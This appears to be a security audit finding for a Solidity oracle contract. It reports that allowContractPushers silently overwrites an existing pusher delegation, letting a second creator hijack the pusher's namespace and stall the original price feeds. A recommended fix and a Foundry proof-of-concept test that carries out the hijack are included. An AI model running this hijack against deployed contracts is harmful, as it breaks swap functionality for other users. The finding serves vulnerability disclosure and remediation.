### Title
`allowContractPushers` Silently Overwrites Existing Delegation, Enabling Namespace Hijack and Feed Staleness — (File: `smart-contracts-poc/contracts/oracles/compressed/CompressedOracle.sol`)

---

### Summary

`CompressedOracleV1.allowContractPushers` does not verify whether a contract pusher is already mapped to another creator before writing `namespaceRemapping[pusher] = msg.sender`. Any address for which `pusher.isPusher(caller)` returns `true` can silently steal the pusher from its current creator. Once stolen, the original creator's feeds receive no further updates, `PriceProvider.getBidAndAskPrice()` returns the stalled sentinel `(0, type(uint128).max)`, and every pool swap backed by those feeds reverts with `FeedStalled`.

---

### Finding Description

`allowContractPushers` proves consent via a live `isPusher(creator)` staticcall and then unconditionally writes:

```solidity
namespaceRemapping[pusher] = msg.sender;   // line 231 — no prior-mapping check
``` [1](#0-0) 

There is no guard of the form `require(namespaceRemapping[pusher] == address(0))`. If a contract pusher's `isPusher` function returns `true` for more than one address — a realistic design for any shared aggregator, multi-tenant oracle relay, or permissive implementation — any of those addresses can call `allowContractPushers` and atomically redirect the pusher's namespace away from the current creator.

The EOA path `allowPushers` is **not** vulnerable to the same attack because the EIP-191 signature binds consent to a specific `(pusher, creator, deadline, chainid, oracle)` tuple; a signature issued for Creator A cannot be replayed by Creator B. [2](#0-1) 

The `fallback` push path resolves the namespace at call time:

```solidity
address creator = namespaceRemapping[msg.sender];
if (creator == address(0)) creator = msg.sender;
``` [3](#0-2) 

After the hijack, every subsequent push from the contract pusher lands in the attacker's namespace. The original creator's storage slots are never updated again.

---

### Impact Explanation

`PriceProvider._getBidAndAskPrice()` calls `offchainOracle.price(offchainFeedId, pool)`, which resolves through `getOracleData` → `_loadSlotLayout`. Once the pusher is hijacked the original creator's slot timestamp stays frozen. [4](#0-3) 

`_isStale` returns `true` when `refTime == 0` (never pushed) or when `nowTs - refTime > MAX_TIME_DELTA`: [5](#0-4) 

A stale result causes `_getBidAndAskPrice` to return `(0, type(uint128).max)`, and the public `getBidAndAskPrice` reverts with `FeedStalled`: [6](#0-5) 

All pool swaps that call `getBidAndAskPrice` are permanently broken until the original creator re-establishes a pusher. This satisfies the **"Broken core pool functionality causing unusable swap flows"** impact gate.

---

### Likelihood Explanation

The attack requires only that the target contract pusher's `isPusher` function returns `true` for the attacker's address. This is a realistic condition for:

- Shared oracle aggregators that authorize multiple creators
- Any contract pusher with a permissive `isPusher` (the test suite's own `MockPusherAllowed` returns `true` for every caller) [7](#0-6) 

No special privilege is required. The attacker calls one public function (`allowContractPushers`) with no ETH and no admin role. The attack is atomic and irreversible without Creator A taking a corrective action.

---

### Recommendation

Add a guard that rejects re-delegation when the pusher is already mapped to a different creator:

```solidity
function allowContractPushers(address[] calldata pushers) external {
    uint256 l = pushers.length;
    for (uint256 i; i < l; i++) {
        address pusher = pushers[i];

        if (pusher == msg.sender) revert NoSelfRemapping();

+       // Prevent silent overwrite of an existing delegation
+       address existing = namespaceRemapping[pusher];
+       if (existing != address(0) && existing != msg.sender)
+           revert AlreadyDelegated(pusher);

        (bool ok, bytes memory res) = pusher.staticcall(
            abi.encodeWithSignature("isPusher(address)", msg.sender)
        );
        require(ok);
        bool allowed = abi.decode(res, (bool));
        require(allowed);

        namespaceRemapping[pusher] = msg.sender;
        emit PusherAuthorized(pusher, msg.sender);
    }
}
```

Alternatively, require the existing creator to call `removePushers` before a new creator can claim the same pusher, mirroring the two-step `setStateGuardRole` / `acceptStateGuardRole` pattern already used for feed guards. [8](#0-7)

### Proof of Concept

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.28;

import {Test} from "forge-std/Test.sol";
import {CompressedOracleV1} from
    "smart-contracts-poc/contracts/oracles/compressed/CompressedOracle.sol";
import {IOffchainOracle} from
    "smart-contracts-poc/contracts/interfaces/IOffchainOracle.sol";

/// A contract pusher that approves ANY caller — realistic for shared aggregators.
contract PermissivePusher {
    function isPusher(address) external pure returns (bool) { return true; }
}

contract NamespaceHijackPoC is Test {
    CompressedOracleV1 oracle;
    address creatorA = address(0xAAAA);
    address creatorB = address(0xBBBB); // attacker

    function setUp() public {
        oracle = new CompressedOracleV1(address(this), 60_000); // 60 s drift
        vm.warp(1_700_000_000);
    }

    function testHijackStealsNamespaceAndStalesFeeds() public {
        PermissivePusher pusherContract = new PermissivePusher();
        address[] memory p = new address[](1);
        p[0] = address(pusherContract);

        // 1. Creator A legitimately delegates the pusher.
        vm.prank(creatorA);
        oracle.allowContractPushers(p);
        assertEq(oracle.namespaceRemapping(address(pusherContract)), creatorA);

        // 2. Attacker (Creator B) steals the pusher — no consent from Creator A.
        vm.prank(creatorB);
        oracle.allowContractPushers(p);                          // ← overwrites silently
        assertEq(oracle.namespaceRemapping(address(pusherContract)), creatorB);

        // 3. Pusher pushes a fresh price — lands in Creator B's namespace.
        uint56 tsMs  = uint56(block.timestamp * 1000);
        uint48 raw   = (uint48(900_000) << 16) | (uint48(5) << 8) | uint48(0);
        uint256 word = (uint256(tsMs) << 8) | 0; // slotId = 0, pos 0
        word |= uint256(raw) << 208;
        vm.prank(address(pusherContract));
        (bool ok,) = address(oracle).call(abi.encodePacked(word));
        assertTrue(ok, "push failed");

        // 4. Creator A's feed is stale (timestampMs == 0).
        IOffchainOracle.OracleData memory dataA =
            oracle.getOracleData(oracle.feedIdOf(creatorA, 0, 0));
        assertEq(dataA.price, 0,        "Creator A feed must be stale");
        assertEq(IOffchainOracle.TimeMs.unwrap(dataA.timestampMs), 0,
                 "Creator A timestamp must be zero");

        // 5. Creator B's feed is live.
        IOffchainOracle.OracleData memory dataB =
            oracle.getOracleData(oracle.feedIdOf(creatorB, 0, 0));
        assertGt(dataB.price, 0, "Creator B feed must be updated");

        // 6. Any PriceProvider backed by Creator A's feedId now returns FeedStalled.
        //    (refTime == 0 → _isStale returns true → (0, type(uint128).max) → FeedStalled)
    }
}
```
